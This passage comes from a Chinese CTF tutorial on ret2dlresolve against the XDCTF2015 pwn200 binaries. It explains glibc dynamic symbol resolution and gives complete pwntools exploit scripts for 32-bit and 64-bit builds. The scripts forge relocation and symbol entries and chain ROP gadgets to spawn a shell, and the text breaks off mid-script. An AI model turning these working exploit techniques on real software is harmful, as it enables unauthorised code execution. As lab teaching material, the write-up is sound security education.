1. 进入_dl_fixup(link_map,reloc_arg)，通过link_map使用宏定义得到.dynsym、.dynstr和.rel.plt的起始地址。
2. 然后将reloc_arg和.rel.plt的起始地址得到某符号的Elf32_Rel结构体的指针地址
3. 使用该符号的Elf32_Rel的r->info成员将(reloc->r_info)>>8的当作索引以搜索该符号的Elf32_Sym地址

和之前的part模式相同，**这里的伪造仍然指的是使用IDA中现成的****Elf32_Sym各个成员来达到调用write函数的目的。**为了方便理解这里选择**倒叙**的方式进行说明：

要想伪造Elf32_Sym结构体就要考虑这个结构体中的成员：

```c
//glibc-2.27/elf/elf.h 中：（约第516行--526行处）
/* Symbol table entry.  */

typedef struct															   //每个Elf32_Sym大小为16字节
{
  Elf32_Word	st_name;		/* Symbol name (string tbl index) */       //uint32_t大小为4字节
  Elf32_Addr	st_value;		/* Symbol value */						   //uint32_t大小为4字节
  Elf32_Word	st_size;		/* Symbol size */                          //uint32_t大小为4字节
  unsigned char	st_info;		/* Symbol type and binding */              //unsigned char大小为1字节
  unsigned char	st_other;		/* Symbol visibility */					   //unsigned char大小为1字节
  Elf32_Section	st_shndx;		/* Section index */						   //uint16_t大小为2字节
} Elf32_Sym;
```

各个值在IDA中在IDA中可以看的到，将他们复制下来就行了：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627978799043-868b5f4b-517a-4fb1-9570-d93ecc01fdec.png)

```python
fake_st_name=0x080482B8-0x0804826C  
fake_st_valve=0
fake_st_size=0 
fake_st_info=0x12
fake_st_other=0
fake_st_shndx=0
fake_write_Elf32_Sym=p32(fake_st_name)+p32(fake_st_valve)+p32(fake_st_size)+p32(fake_st_info)+p32(fake_st_other)+p32(fake_st_shndx)
```

然后需要伪造Elf32_Rel结构体：

```c
//glibc-2.27/elf/elf.h 中：（约第631行）
/* Relocation table entry without addend (in section of type SHT_REL).  */

typedef struct
{
  Elf32_Addr	r_offset;		/* Address */    //uint32_t大小为4字节
  Elf32_Word	r_info;			/* Relocation type and symbol index */   //uint32_t大小为4字节
} Elf32_Rel;
```

在这个结构体中，只有r_offset是已知的（.got.plt），r_info是未知的，r_info还有个assert断言检查：

```c
  /* Sanity check that we're really looking at a PLT relocation.  */
  assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);   //ELF_MACHINE_JMP_SLOT==0x7
```

这里要求reloc->r_info最低位必须为7，否则就会终止程序；前边讲过r_info>>8后会得到一个索引，对应此导入符号在ELF Symbol Table中的索引（exp中称为dynsym_index）：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627978799043-868b5f4b-517a-4fb1-9570-d93ecc01fdec.png)

> 注意，这里的索引和C语言数组的索引相同，都是从0开始的；在此part中不能使用IDA中Elf32_Rel任何成员值。
>

索引的计算可以使用如下公式进行计算：

```python
real_dynsym_start_addr=elf.get_section_by_name('.dynsym').header.sh_addr
dynsym_index=(fake_write_Elf32_Sym_addr-real_dynsym_start_addr)/0x10  
#伪造的ELF32_Sym的地址-真实的Elf32_Sym的起始地址的结果除10就是该索引即dynsym_index
```

然后再将dynsym_index>>8的最低位变为7就可以了；综上，payload如下：

```python
fake_r_offset=elf.got['write']   
dynsym_index=(fake_write_Elf32_Sym_addr-real_dynsym_start_addr)/0x10
fake_r_info=(dynsym_index<<0x8)|0x7                      #根据dynsym_index反推r_info
fake_write_Elf32_Rel=p32(fake_r_offset)+p32(fake_r_info) #伪造write的Elf32_Rel结构体
```

> 在ELF中：r_info>>8==(dynsym_index<<0x8) | 0x7
>

这里还得考虑一下Elf32_Sym结构体的对齐问题，Elf32_Rel的结构太过简单所以不用考虑，但是Elf32_Sym牵扯到后面的version计算和复杂的_dl_lookup_symbol_x函数执行；为了防止程序崩溃，这里得考虑一下对齐的问题，根据前面的经验可以知道构造的payload结构是这样的：

```python
payload2=p32(0xdeadbeef)+p32(jmp_to_dl_runtime_resolve_addr)+p32(fake_reloc_arg)+p32(0xdeadbeef)
payload2+=p32(1)+p32(bss_addr+0x300+80)+p32(len(string))
payload2+=fake_write_Elf32_Rel
payload2+='b'*align                #进行16字节对齐
payload2+=fake_write_Elf32_Sym     #新增伪造的write_Elf32_Sym结构体

payload2+='c'*(80-len(payload2))   #补全，使write打印出"/bin/shx\00"
payload2+=string                   #"/bin/sh\x00"字符串
payload2+='d'*(100-len(payload2))
```

因为这个结构体的大小为16字节，所以要符合16字节的对齐方式，下面是计算填充的方法：

```python
real_dynsym_start_addr=elf.get_section_by_name('.dynsym').header.sh_addr

fake_write_Elf32_Sym_addr=new_stack_esp+4*9
align=0x10-((fake_write_Elf32_Sym_addr-real_dynsym_start_addr)&0xf) #计算要对齐的数值
fake_write_Elf32_Sym_addr=fake_write_Elf32_Sym_addr+align           #重新计算fake_Elf32_Sym地址
```

完整的exp如下：

```python
#coding=utf-8
from pwn import *
context.log_level="debug"

p=process('./main_partial_relro_32')
elf=ELF('./main_partial_relro_32')
bss_addr=elf.bss()
read_plt=elf.plt['read']
write_plt=elf.plt['write']

pop_ebp_gadget=0x0804864b
leave_retn_gadget=0x08048465 #mov esp,ebp;pop ebp
three_pop_gadget=0x08048649


new_stack_esp=bss_addr+0x300
new_stack_ebp=bss_addr+0x500
payload1='a'*112+p32(read_plt)+p32(three_pop_gadget)+p32(0)+p32(bss_addr+0x300)+p32(0x100)#esp低地址；ebp高地址
payload1+=p32(pop_ebp_gadget)+p32(new_stack_esp)+p32(leave_retn_gadget) #eip->bss
p.recvuntil('Welcome to XDCTF2015~!\n')
p.sendline(payload1)

jmp_to_dl_runtime_resolve_addr=0x08048370
string="/bin/sh\x00"

fake_write_Elf32_Rel_addr=new_stack_esp+4*7 #一个p32占四字节，执行leave中的pop ebp后开始计算
                                            #fake_write_addr指fake_write_Elf32_Rel的地址
rel_plt_start_addr=0x8048324
fake_reloc_arg=fake_write_Elf32_Rel_addr-rel_plt_start_addr

#fake_r_offset=elf.got['write']  
#fake_r_info=0x607
#fake_write_Elf32_Rel=p32(fake_r_offset)+p32(fake_r_info) #伪造write的Elf32_Rel结构体

fake_st_name=0x080482B8-0x0804826C  
fake_st_valve=0
fake_st_size=0 
fake_st_info=0x12
fake_st_other=0
fake_st_shndx=0
fake_write_Elf32_Sym=p32(fake_st_name)+p32(fake_st_valve)+p32(fake_st_size)+p8(fake_st_info)+p8(fake_st_other)+p16(fake_st_shndx)

real_dynsym_start_addr=elf.get_section_by_name('.dynsym').header.sh_addr

fake_write_Elf32_Sym_addr=new_stack_esp+4*9
align=0x10-((fake_write_Elf32_Sym_addr-real_dynsym_start_addr)&0xf) #进行对齐
fake_write_Elf32_Sym_addr=fake_write_Elf32_Sym_addr+align           #重新计算fake_Elf32_Sym地址

fake_r_offset=elf.got['write']   
dynsym_index=(fake_write_Elf32_Sym_addr-real_dynsym_start_addr)/0x10
fake_r_info=(dynsym_index<<0x8)|0x7                      #根据fake_Elf32_Sym反推r_info
fake_write_Elf32_Rel=p32(fake_r_offset)+p32(fake_r_info) #伪造write的Elf32_Rel结构体

payload2=p32(0xdeadbeef)+p32(jmp_to_dl_runtime_resolve_addr)+p32(fake_reloc_arg)+p32(0xdeadbeef)
payload2+=p32(1)+p32(bss_addr+0x300+80)+p32(len(string)) #len("/bin/sh\x00")==0x10
payload2+=fake_write_Elf32_Rel
payload2+='b'*align
payload2+=fake_write_Elf32_Sym   #new

payload2+='c'*(80-len(payload2)) #注意把这里的偏移改一下，因为加了一个fake_write_Elf32_Rel
payload2+=string
payload2+='d'*(100-len(payload2))
#gdb.attach(p)
p.sendline(payload2)
p.interactive()
```

> ⚠️注意，在伪造fake_write_Elf32_Sym结构体时要注意这个结构体中每个成员的大小是有区别的，不是所有的成员都是p32，这个要根据成员的大小来定
>

### ![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627990121410-48ac42e2-6624-40c9-bb38-b96585e4cffd.png)
#### Part4
既然在part3中可以伪造Elf32_Sym结构体，这里替换一下结构体中的st->name将其布置在stack上，这里简单的更改一下即可：<font style="background-color:#FADB14;"></font>

```python
#coding=utf-8
from pwn import *
context.log_level="debug"

p=process('./main_partial_relro_32')
elf=ELF('./main_partial_relro_32')
bss_addr=elf.bss()
read_plt=elf.plt['read']
write_plt=elf.plt['write']

pop_ebp_gadget=0x0804864b
leave_retn_gadget=0x08048465 #mov esp,ebp;pop ebp
three_pop_gadget=0x08048649

new_stack_esp=bss_addr+0x300
new_stack_ebp=bss_addr+0x500
payload1='a'*112+p32(read_plt)+p32(three_pop_gadget)+p32(0)+p32(bss_addr+0x300)+p32(0x100)#esp低地址；ebp高地址
payload1+=p32(pop_ebp_gadget)+p32(new_stack_esp)+p32(leave_retn_gadget) #eip->bss
p.recvuntil('Welcome to XDCTF2015~!\n')
p.sendline(payload1)

jmp_to_dl_runtime_resolve_addr=0x08048370
string="/bin/sh\x00"

fake_write_Elf32_Rel_addr=new_stack_esp+4*7 #一个p32占四字节，执行leave中的pop ebp后开始计算
                                            #fake_write_addr指fake_write_Elf32_Rel的地址
rel_plt_start_addr=0x8048324
fake_reloc_arg=fake_write_Elf32_Rel_addr-rel_plt_start_addr

#fake_r_offset=elf.got['write']  
#fake_r_info=0x607
#fake_write_Elf32_Rel=p32(fake_r_offset)+p32(fake_r_info) #伪造write的Elf32_Rel结构体

#fake_st_name=0x080482B8-0x0804826C  
real_dynsym_start_addr=elf.get_section_by_name('.dynsym').header.sh_addr

fake_write_Elf32_Sym_addr=new_stack_esp+4*9
align=0x10-((fake_write_Elf32_Sym_addr-real_dynsym_start_addr)&0xf) #进行对齐
fake_write_Elf32_Sym_addr=fake_write_Elf32_Sym_addr+align           #重新计算fake_Elf32_Sym地址

fake_r_offset=elf.got['write']   
dynsym_index=(fake_write_Elf32_Sym_addr-real_dynsym_start_addr)/0x10
fake_r_info=(dynsym_index<<0x8)|0x7                      #根据fake_Elf32_Sym反推r_info
fake_write_Elf32_Rel=p32(fake_r_offset)+p32(fake_r_info) #伪造write的Elf32_Rel结构体
#########################################################################################
fake_write_string='write\x00'
fake_write_string_addr=new_stack_esp+4*9+align+0x4*4
read_strtab_start_addr=elf.get_section_by_name('.dynstr').header.sh_addr
fake_st_name=fake_write_string_addr-read_strtab_start_addr
fake_st_valve=0
fake_st_size=0 
fake_st_info=0x12
fake_st_other=0
fake_st_shndx=0
fake_write_Elf32_Sym=p32(fake_st_name)+p32(fake_st_valve)+p32(fake_st_size)+p8(fake_st_info)+p8(fake_st_other)+p16(fake_st_shndx)
#########################################################################################
payload2=p32(0xdeadbeef)+p32(jmp_to_dl_runtime_resolve_addr)+p32(fake_reloc_arg)+p32(0xdeadbeef)
payload2+=p32(1)+p32(bss_addr+0x300+80)+p32(len(string))  #len("/bin/sh\x00")==0x10
payload2+=fake_write_Elf32_Rel
payload2+='b'*align
payload2+=fake_write_Elf32_Sym   
payload2+=fake_write_string    #new

payload2+='c'*(80-len(payload2))
payload2+=string
payload2+='d'*(100-len(payload2))

#gdb.attach(p,"dir /home/ubuntu/Desktop/malloc/glibc/glibc-2.27/elf/")
p.sendline(payload2)
p.interactive()
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628050763614-92c39232-33b2-4c5d-9938-96e104a7b548.png)

#### Part5
第5步很简单，将write改为system，再调整一下参数即可拿到shell：

```python
#coding=utf-8
from pwn import *
context.log_level="debug"

p=process('./main_partial_relro_32')
elf=ELF('./main_partial_relro_32')
bss_addr=elf.bss()
read_plt=elf.plt['read']
write_plt=elf.plt['write']

pop_ebp_gadget=0x0804864b
leave_retn_gadget=0x08048465 #mov esp,ebp;pop ebp
three_pop_gadget=0x08048649

new_stack_esp=bss_addr+0x300
new_stack_ebp=bss_addr+0x500
payload1='a'*112+p32(read_plt)+p32(three_pop_gadget)+p32(0)+p32(bss_addr+0x300)+p32(0x100)#esp低地址；ebp高地址
payload1+=p32(pop_ebp_gadget)+p32(new_stack_esp)+p32(leave_retn_gadget) #eip->bss
p.recvuntil('Welcome to XDCTF2015~!\n')
p.sendline(payload1)

jmp_to_dl_runtime_resolve_addr=0x08048370
string="/bin/sh\x00"

fake_write_Elf32_Rel_addr=new_stack_esp+4*7 #一个p32占四字节，执行leave中的pop ebp后开始计算
                                            #fake_write_addr指fake_write_Elf32_Rel的地址
rel_plt_start_addr=0x8048324
fake_reloc_arg=fake_write_Elf32_Rel_addr-rel_plt_start_addr

#fake_r_offset=elf.got['write']  
#fake_r_info=0x607
#fake_write_Elf32_Rel=p32(fake_r_offset)+p32(fake_r_info) #伪造write的Elf32_Rel结构体

#fake_st_name=0x080482B8-0x0804826C  
real_dynsym_start_addr=elf.get_section_by_name('.dynsym').header.sh_addr

fake_write_Elf32_Sym_addr=new_stack_esp+4*9
align=0x10-((fake_write_Elf32_Sym_addr-real_dynsym_start_addr)&0xf) #进行对齐
fake_write_Elf32_Sym_addr=fake_write_Elf32_Sym_addr+align           #重新计算fake_Elf32_Sym地址

fake_r_offset=elf.got['write']   
dynsym_index=(fake_write_Elf32_Sym_addr-real_dynsym_start_addr)/0x10
fake_r_info=(dynsym_index<<0x8)|0x7                      #根据fake_Elf32_Sym反推r_info
fake_write_Elf32_Rel=p32(fake_r_offset)+p32(fake_r_info) #伪造write的Elf32_Rel结构体

fake_system_string='system\x00'               #更改为system\x00
fake_write_string_addr=new_stack_esp+4*9+align+0x4*4
read_strtab_start_addr=elf.get_section_by_name('.dynstr').header.sh_addr
fake_st_name=fake_write_string_addr-read_strtab_start_addr
fake_st_valve=0
fake_st_size=0 
fake_st_info=0x12
fake_st_other=0
fake_st_shndx=0
fake_write_Elf32_Sym=p32(fake_st_name)+p32(fake_st_valve)+p32(fake_st_size)+p8(fake_st_info)+p8(fake_st_other)+p16(fake_st_shndx)

bin_sh_addr=new_stack_esp+80   #通过计算可以得到
payload2=p32(0xdeadbeef)+p32(jmp_to_dl_runtime_resolve_addr)+p32(fake_reloc_arg)+p32(0xdeadbeef)  
#payload2+=p32(1)+p32(bss_addr+0x300+80)+p32(len(string))  #len("/bin/sh\x00")==0x10
payload2+=p32(bin_sh_addr)+p32(0xdeadbeef)*2  #p32(0xdeadbeef)*2用于补全
payload2+=fake_write_Elf32_Rel
payload2+='b'*align
payload2+=fake_write_Elf32_Sym   
payload2+=fake_system_string                  #更改这里

payload2+='c'*(80-len(payload2))
payload2+=string
payload2+='d'*(100-len(payload2))

#gdb.attach(p,"dir /home/ubuntu/Desktop/malloc/glibc/glibc-2.27/elf/")
p.sendline(payload2)
p.interactive()
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628057056162-2b093765-00e5-429d-97b1-0ae83c1fd4fc.png)

#### 总结
上述的每一个part对应的动态链接过程中的每一步进行pwn：

+ part1：伪造reloc_arg
+ part2：伪造Elf32_Rel结构体->经计算后伪造reloc_arg
+ part3：伪造Elf32_Sym结构体->计算在栈上伪造的Elf32_Rel结构体地址>经计算后伪造reloc_arg
+ part4：伪造st->name字符串->计算字符串地址->伪造Elf32_Sym结构体->计算在栈上伪造的Elf32_Rel结构体地址>经计算后伪造reloc_arg
+ part5：write函数换为system，同时调整参数即可拿到shell

pwn的思考步骤要和符号解析的顺序相反，倒着推更容易。

#### 一些补充
如果你看过CTF wiki上写的STAGE 4就会发现在本文的代码中并没有出现程序崩溃，这是因为在栈迁移的过程中正好迁移到了恰当的位置，这里跟一下，我们将Part中的代码改为如下部分就会崩溃：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628141660612-bc079f81-31ca-42a0-aad6-750637638eb0.png)

我们调试一下看在哪里崩溃，回溯栈帧可以发现是在_dl_fixup的version处发生崩溃

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628141839839-d7b897c9-3d13-4e49-84fd-014a99cdbb00.png)

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628141872391-0c61b3ce-3c8f-4dcb-874c-e125b813a147.png)

这里是访问到了非法地址所导致崩溃，既然version会崩溃，那么说明所伪造的ndx有问题：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628142370219-1867fa05-62de-4144-9963-b73ccdb67f66.png)

因为l_version是一个数组而且C语言没有对数组的越界进行检查，这么大的数去求version肯定有问题；如上图所示，这样是看不了ndx地址的，我们可以换种方法看，在exp中加入如下代码：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628142276381-9788f4af-7c00-40c8-8926-56fe98e71324.png)

再次运行之后就会打印处此地址

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628142461434-203580f8-fa1e-4838-acbd-09688ce96b4a.png)

对应到IDA中为：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628142555913-04938b9f-936c-4a59-8115-ce3561b6a7de.png)

> 12302==0x300E（小端序）
>

可以看到索引到的ndx落到了.eh_frame节，在原来不崩溃的情况下索引到的是：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628142990005-fe7923ce-f36b-42bc-8975-68393a922c7d.png)

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628142831525-cb99010e-657d-4f6e-ac51-907addaaa485.png)

恰好是0x0，并且就算version 为 NULL，也会正常解析符号。所以解决程序崩溃的问题很简单，只要调整一下栈迁移的地址（new_stack_esp）就行了；当然还有一种方法，在之后的64位中会说到

### Full RELRO
> [https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/full-relro/main_full_relro_32](https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/full-relro/main_full_relro_32)
>

在Full RELRO中，我们无法使用这种方法进行攻击，因为在函数调用之前的程序加载过程中真实地址已经被解析完毕：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628058856530-29b69305-45ea-4190-914b-87e9953e8743.png)

jmp之后直接到函数的真实地址去执行代码：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628058926280-b35d94de-e808-4923-ab7c-9849a52905a2.png)

> 在Full RELRO中.got.plt变为只读
>

因此 got 表中 link_map 以及 dl_runtime_resolve 函数地址在程序执行的过程中不会被用到。故而，GOT表中的link_map（0x8049FD8）和_dl_runtime_resolve（0x）均为0

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628059105328-40087011-46d8-4b06-bdc4-9c12809c01a2.png)

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628493154019-3f2eeaeb-e178-4f7d-9455-8ec634f62c05.png)

> .got.plt在此保护中已不存在
>

# ret2dlresolve_x64
64位程序和32位程序的动态链接的过程基本相同，出现与32位不同含义的参数会仔细说明，首先来看程序的ELF结构体。

## ELF结构体
> 各个结构体含义请参考32位的内容。
>

### _DYNAMIC--ELF64_Dyn
ELF64_Dyn结构体的定义如下：

```c
//glibc-2.27/elf/elf.h 约第818-826
typedef struct
{
  Elf64_Sxword	d_tag;			/* Dynamic entry type */    //不计算大小
  union
    {
      Elf64_Xword d_val;		/* Integer value */         //int64_t   ：8字节
      Elf64_Addr d_ptr;			/* Address value */         //uint64_t  ：8字节
    } d_un;
} Elf64_Dyn;   //每个结构体占16字节
```

### ![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628331913178-b2caad7e-2b79-4d96-bff4-626405c8e7a5.png)
### dynstr--DT_STRTAB--ELF_String_Table
![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628332089757-0d9bc879-fc8d-4928-aded-90a0120c2a52.png)

### .dynsym--DT_SYMTAB--ELF Symbol Table--Elf64_Sym结构体
![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628332129434-6090869f-5b18-4f77-b7f7-f7a748a24d6b.png)

这个结构体的定义如下：

```c
typedef struct
{
  Elf64_Word	st_name;		/* Symbol name (string tbl index) */   //uint32_t      ：4字节
  unsigned char	st_info;		/* Symbol type and binding */          //unsigned char ：1字节
  unsigned char st_other;		/* Symbol visibility */				   //unsigned char ：1字节
  Elf64_Section	st_shndx;		/* Section index */					   //uint16_t      ：2字节
  Elf64_Addr	st_value;		/* Symbol value */					   //uint64_t      ：8字节
  Elf64_Xword	st_size;		/* Symbol size */					   //uint64_t      ：8字节
} Elf64_Sym;    //每个结构体占24字节
```

> 该结构体成员的顺序32位和64位不一样
>

### .rel.plt--DT_JMPREL--ELF JMPREL Relocation Table--Elf32_Rel
![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628332220626-b174dc28-e15b-43d9-b2bb-1786a9a0ad68.png)

```c
/* Relocation table entry without addend (in section of type SHT_REL).  */

typedef struct
{
  Elf64_Addr	r_offset;		/* Address */                            //uint64_t：8字节
  Elf64_Xword	r_info;			/* Relocation type and symbol index */   //uint64_t：8字节
} Elf64_Rel;   //每个结构体占16字节

/* Relocation table entry with addend (in section of type SHT_RELA).  */

typedef struct
{
  Elf64_Addr	r_offset;		/* Address */							 //uint64_t：8字节
  Elf64_Xword	r_info;			/* Relocation type and symbol index */   //uint64_t：8字节
  Elf64_Sxword	r_addend;		/* Addend */                             //int64_t ：8字节
} Elf64_Rela;  //每个结构体占24字节
```

## _dl_runtime_resolve_xsavec
与32位不同，在64位中此函数的名称为_dl_runtime_resolve_xsavec；但是无论是在32位程序或者是64位程序中这个函数的参数都是一样的：_dl_runtime_resolve_xsavec(link_map,reloc_arg)。这里的reloc_arg和32位的有所不同，不再代表偏移而是代表索引：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628425484661-84431e23-8bcd-4960-be7d-7c32c90ca765.png)

这里伪造reloc_arg时需要注意一下。

> 偏移：从起始地址到某地址的距离；索引：类似C语言中的索引，从0开始
>

## _dl_fixup
32位和64位共用一个_dl_fixup。

## 开始pwn
**在64位中只是将数据写入到了bss+0x200（new_stack_esp）处，并没有进行栈迁移。**

### No RELRO
和32位的例子一模一样，只不过我们给他编译成了64位，在这一步中我们的目的是拿到shell。

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628145141147-9a117f63-0153-4dc4-857e-853fb2ed5cb7.png)

程序的RELRO完全没有开启，所以它的_DYNAMIC节是可以修改的；和32位中的No RELRO方法完全相同，直接上exp：

```python
#coding=utf-8
from pwn import *
context.log_level='debug'
context.terminal = ['tmux','splitw','-h']
context.arch='amd64'

p=process('./main_no_relro_64')
elf=ELF('./main_no_relro_64')
bss_addr=elf.bss()
'''
root@4de10445acf0:~/ret2dlresolve/main/x64/No_RELRO# ROPgadget --binary ./main_no_relro_64 --only "pop|ret"
Gadgets information
============================================================
0x000000000040076c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040076e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400770 : pop r14 ; pop r15 ; ret
0x0000000000400772 : pop r15 ; ret
0x000000000040076b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040076f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400588 : pop rbp ; ret
0x0000000000400773 : pop rdi ; ret
0x0000000000400771 : pop rsi ; pop r15 ; ret
0x000000000040076d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004004c6 : ret
0x00000000004006e4 : ret 0x8d48

Unique gadgets found: 12
root@4de10445acf0:~/ret2dlresolve/main/x64/No_RELRO# ROPgadget --binary ./main_no_relro_64 --only "leave|ret"
Gadgets information
============================================================
0x000000000040063c : leave ; ret
0x00000000004004c6 : ret
0x00000000004006e4 : ret 0x8d48

Unique gadgets found: 3
root@4de10445acf0:~/ret2dlresolve/main/x64/No_RELRO# 
'''
leave_ret_gadget_addr=0x40063c
libc_csu_init_gadget_start1_addr=0x40076A
libc_csu_init_gadget_start2_addr=0x400750

read_got_addr=elf.got['read']
new_stack_esp=bss_addr+0x200
#64位寄存器传参：rdi, rsi, rdx, rcx, r8, r9。
#此程序中没有pop rdx的gadget
#ret2csu调用read
'''
text:0000000000400750 loc_400750:                             ; CODE XREF: __libc_csu_init+54↓j
.text:0000000000400750                 mov     rdx, r15
.text:0000000000400753                 mov     rsi, r14
.text:0000000000400756                 mov     edi, r13d
.text:0000000000400759                 call    qword ptr [r12+rbx*8]  //r12 read_got ;rbx==0
.text:000000000040075D                 add     rbx, 1
.text:0000000000400761                 cmp     rbp, rbx               
.text:0000000000400764                 jnz     short loc_400750       //相等；rbp==1
.text:0000000000400766
.text:0000000000400766 loc_400766:                             ; CODE XREF: __libc_csu_init+34↑j
.text:0000000000400766                 add     rsp, 8
.text:000000000040076A                 pop     rbx          //rbx==0
.text:000000000040076B                 pop     rbp          //rbp==1
.text:000000000040076C                 pop     r12          //read_got
.text:000000000040076E                 pop     r13          //read1参
.text:0000000000400770                 pop     r14          //read2参
.text:0000000000400772                 pop     r15          //read3参
.text:0000000000400774                 retn
'''

pop_rbp_gadget_addr=0x0000000000400588

main_addr=elf.symbols['main']
vuln_addr=elf.symbols['vuln']

payload=120*'a'+p64(libc_csu_init_gadget_start1_addr)+p64(0)+p64(1)+p64(read_got_addr)+p64(0)+p64(0x0600988+0x8)+p64(0x8)
payload+=p64(libc_csu_init_gadget_start2_addr)+p64(0xdeadbeef)*7+p64(vuln_addr)
p.recvuntil('Welcome to XDCTF2015~!\n')
p.send(payload)
#gdb.attach(proc.pidof(p)[0],gdbscript="dir /root/ret2dlresolve/malloc/glibc/glibc-2.27/elf/")
#p.sendline(p64(new_stack_esp+0x10))
p.send(p64(new_stack_esp+0x10)) #这里不可以使用p.sendline

payload1=110*'c'+'d'*10+p64(libc_csu_init_gadget_start1_addr)+p64(0)+p64(1)+p64(read_got_addr)+p64(0)+p64(new_stack_esp)+p64(0x100)
payload1+=p64(libc_csu_init_gadget_start2_addr)+p64(0xdeadbeef)*7+p64(vuln_addr)
#p.recvuntil('Welcome to XDCTF2015~!\n')
p.send(payload1)
dynstr=elf.get_section_by_name('.dynstr').data()
fake_dynstr=dynstr.replace('read','system')
payload2='/bin/bash\x00'.ljust(0x10,'\x00')+fake_dynstr #向new_stack_esp写入数据
p.send(payload2) 

read_plt_addr=elf.plt['read']
payload3=120*'e'+p64(0x400771)+p64(0)*2+p64(0x400773)+p64(new_stack_esp)+p64(read_plt_addr+6)+p64(0xdeadbeef)
p.send(payload3)

p.interactive()
```

当然，你也可以一条rop链直接解决问题：

```python
#coding=utf-8
from pwn import *
context.log_level='debug'
context.terminal = ['tmux','splitw','-h']
context.arch='amd64'

p=process('./main_no_relro_64')
elf=ELF('./main_no_relro_64')
bss_addr=elf.bss()
'''
root@4de10445acf0:~/ret2dlresolve/main/x64/No_RELRO# ROPgadget --binary ./main_no_relro_64 --only "pop|ret"
Gadgets information
============================================================
0x000000000040076c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040076e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400770 : pop r14 ; pop r15 ; ret
0x0000000000400772 : pop r15 ; ret
0x000000000040076b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040076f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400588 : pop rbp ; ret
0x0000000000400773 : pop rdi ; ret
0x0000000000400771 : pop rsi ; pop r15 ; ret
0x000000000040076d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004004c6 : ret
0x00000000004006e4 : ret 0x8d48

Unique gadgets found: 12
root@4de10445acf0:~/ret2dlresolve/main/x64/No_RELRO# ROPgadget --binary ./main_no_relro_64 --only "leave|ret"
Gadgets information
============================================================
0x000000000040063c : leave ; ret
0x00000000004004c6 : ret
0x00000000004006e4 : ret 0x8d48

Unique gadgets found: 3
root@4de10445acf0:~/ret2dlresolve/main/x64/No_RELRO# 
'''

#64位寄存器传参：rdi, rsi, rdx, rcx, r8, r9。
#此程序中没有pop rdx的gadget
#ret2csu调用read
'''
text:0000000000400750 loc_400750:                             ; CODE XREF: __libc_csu_init+54↓j
.text:0000000000400750                 mov     rdx, r15
.text:0000000000400753                 mov     rsi, r14
.text:0000000000400756                 mov     edi, r13d
.text:0000000000400759                 call    qword ptr [r12+rbx*8]  //r12 read_got ;rbx==0
.text:000000000040075D                 add     rbx, 1
.text:0000000000400761                 cmp     rbp, rbx               
.text:0000000000400764                 jnz     short loc_400750       //相等；rbp==1
.text:0000000000400766
.text:0000000000400766 loc_400766:                             ; CODE XREF: __libc_csu_init+34↑j
.text:0000000000400766                 add     rsp, 8
.text:000000000040076A                 pop     rbx          //rbx==0
.text:000000000040076B                 pop     rbp          //rbp==1
.text:000000000040076C                 pop     r12          //read_got
.text:000000000040076E                 pop     r13          //read1参
.text:0000000000400770                 pop     r14          //read2参
.text:0000000000400772                 pop     r15          //read3参
.text:0000000000400774                 retn
'''


libc_csu_init_gadget_start1_addr=0x40076A
libc_csu_init_gadget_start2_addr=0x400750

#read_got_addr=elf.got['read']
read_plt_addr=elf.plt['read']
strlen_plt_addr=elf.plt['strlen']

new_stack_esp=bss_addr+0x200
pop_rbp_gadget_addr=0x0000000000400588
pop_rdi_gadget=0x400773
pop_rsi_r15_gadget=0x400771
leave_ret_gadget_addr=0x40063c

main_addr=elf.symbols['main']
vuln_addr=elf.symbols['vuln']


payload1=120*'a'
payload1+=p64(pop_rdi_gadget)+p64(0)+p64(pop_rsi_r15_gadget)+p64(new_stack_esp)+p64(0xdeadbeef)+p64(read_plt_addr)
payload1+=p64(pop_rdi_gadget)+p64(0)+p64(pop_rsi_r15_gadget)+p64(0x0600988+0x8)+p64(0xdeadbeef)+p64(read_plt_addr)
payload1+=p64(0x4004c6)+p64(pop_rdi_gadget)+p64(new_stack_esp)+p64(strlen_plt_addr+0x6) 
#0x4004c6为return，是为了调整栈避免调用system时段错误:movaps xmmword ptr [rsp + 0x40], xmm0
p.recvuntil('Welcome to XDCTF2015~!\n')
p.send(payload1)

dynstr=elf.get_section_by_name('.dynstr').data()
fake_dynstr=dynstr.replace('strlen','system')

